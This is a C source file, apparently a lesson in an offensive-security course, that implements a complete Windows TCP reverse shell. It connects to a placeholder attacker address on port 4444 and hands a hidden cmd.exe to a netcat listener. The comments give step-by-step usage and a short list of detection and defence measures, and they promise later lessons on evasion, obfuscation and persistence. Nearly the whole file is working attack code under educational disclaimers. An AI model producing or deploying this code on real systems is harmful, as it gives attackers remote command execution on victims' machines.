/*
 * Lesson 04: Basic TCP Reverse Shell
 *
 * EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED TESTING ONLY
 *
 * Concepts covered:
 * - Reverse shell concept: Target connects BACK to attacker
 * - Process creation with redirected I/O
 * - STARTUPINFO and PROCESS_INFORMATION structures
 * - Redirecting stdin/stdout/stderr to socket
 * - CreateProcess with handle inheritance
 *
 * Reverse Shell vs Bind Shell:
 *
 * BIND SHELL:
 *   Target opens port and waits for attacker to connect
 *   Problem: Firewalls block INCOMING connections
 *
 * REVERSE SHELL:
 *   Target connects OUT to attacker
 *   Benefit: OUTGOING connections often allowed
 *
 * Basic flow:
 * 1. Connect to attacker's IP:PORT
 * 2. Spawn cmd.exe process
 * 3. Redirect cmd.exe stdin/stdout/stderr to socket
 * 4. Attacker can now send commands and receive output
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 4444

int main(void) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int result;

    printf("[*] Reverse Shell Example (Educational)\n");
    printf("[!] FOR AUTHORIZED TESTING ONLY\n\n");

    /* Initialize Winsock */
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("[!] WSAStartup failed: %d\n", result);
        return 1;
    }

    /* Create socket */
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[!] socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    /* Setup attacker address */
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &serverAddr.sin_addr);

    printf("[*] Connecting back to %s:%d...\n", ATTACKER_IP, ATTACKER_PORT);

    /* Connect to attacker */
    result = connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[!] connect() failed: %d\n", WSAGetLastError());
        printf("[!] Make sure listener is running: nc -lvp %d\n", ATTACKER_PORT);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Connected to attacker!\n");
    printf("[*] Spawning shell...\n");

    /*
     * STARTUPINFO structure controls process creation
     *
     * Key fields for I/O redirection:
     * - dwFlags: Flags indicating which fields to use
     * - hStdInput: Handle for stdin
     * - hStdOutput: Handle for stdout
     * - hStdError: Handle for stderr
     */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    /*
     * STARTF_USESTDHANDLES: Use hStdInput/Output/Error
     * STARTF_USESHOWWINDOW: Use wShowWindow flag
     */
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    /*
     * Critical: Redirect all I/O to the socket
     *
     * Cast SOCKET to HANDLE:
     * - Winsock sockets ARE Windows handles
     * - Can be used with CreateProcess
     */
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    /*
     * CreateProcess spawns cmd.exe with redirected I/O
     *
     * Parameters:
     * - NULL: No application name (use command line)
     * - "cmd.exe": Command to execute
     * - NULL, NULL: Default security attributes
     * - TRUE: CRITICAL - Inherit handles from parent
     * - 0: No special creation flags
     * - NULL: Inherit parent's environment
     * - NULL: Inherit parent's current directory
     * - &si: Startup info (with redirected handles)
     * - &pi: Receives process information
     */
    result = CreateProcessA(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,           /* bInheritHandles - MUST be TRUE */
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!result) {
        printf("[!] CreateProcess failed: %d\n", GetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Shell spawned!\n");
    printf("[*] Process ID: %d\n", pi.dwProcessId);
    printf("[*] Thread ID: %d\n", pi.dwThreadId);
    printf("[*] Shell is now interactive on attacker's listener\n");

    /*
     * Wait for cmd.exe to exit
     *
     * When attacker types 'exit', cmd.exe terminates
     * INFINITE: Wait indefinitely
     */
    printf("[*] Waiting for shell to exit...\n");
    WaitForSingleObject(pi.hProcess, INFINITE);

    printf("[*] Shell terminated\n");

    /* Cleanup process handles */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Cleanup socket */
    closesocket(sock);
    WSACleanup();

    printf("[+] Reverse shell cleanup complete\n");

    return 0;
}

/*
 * How handle redirection works:
 *
 * Normal cmd.exe:
 *   stdin  -> Keyboard
 *   stdout -> Console
 *   stderr -> Console
 *
 * Reverse shell cmd.exe:
 *   stdin  -> Socket (receives commands from attacker)
 *   stdout -> Socket (sends command output to attacker)
 *   stderr -> Socket (sends errors to attacker)
 *
 * Result: Attacker types commands, sees output, as if local!
 *
 *
 * Testing this reverse shell:
 *
 * 1. Start netcat listener on attacker machine:
 *    nc -lvp 4444
 *
 * 2. Run reverse shell on target:
 *    04-reverse-shell.exe
 *
 * 3. In netcat, you now have a shell:
 *    dir
 *    whoami
 *    ipconfig
 *    exit
 *
 *
 * Detection and Defense:
 *
 * DETECTABLE by:
 * - Network monitoring (outbound connection to unusual port)
 * - EDR/AV (suspicious process spawning)
 * - Firewall (outbound connection from unexpected process)
 *
 * Defense:
 * - Outbound firewall rules
 * - Monitor for cmd.exe with redirected handles
 * - Network traffic analysis
 * - Application whitelisting
 *
 *
 * Real-world improvements (covered in later modules):
 * - Encryption (TLS/SSL)
 * - Obfuscation (hide strings, encrypt shellcode)
 * - Evasion (avoid spawning cmd.exe, use in-memory techniques)
 * - Persistence (auto-start on boot)
 * - C2 protocol (structured commands, not raw shell)
 *
 *
 * LEGAL WARNING:
 * This code is for EDUCATIONAL purposes and AUTHORIZED testing ONLY.
 * Unauthorized access to computer systems is ILLEGAL.
 * Only use on systems you own or have explicit permission to test.
 */
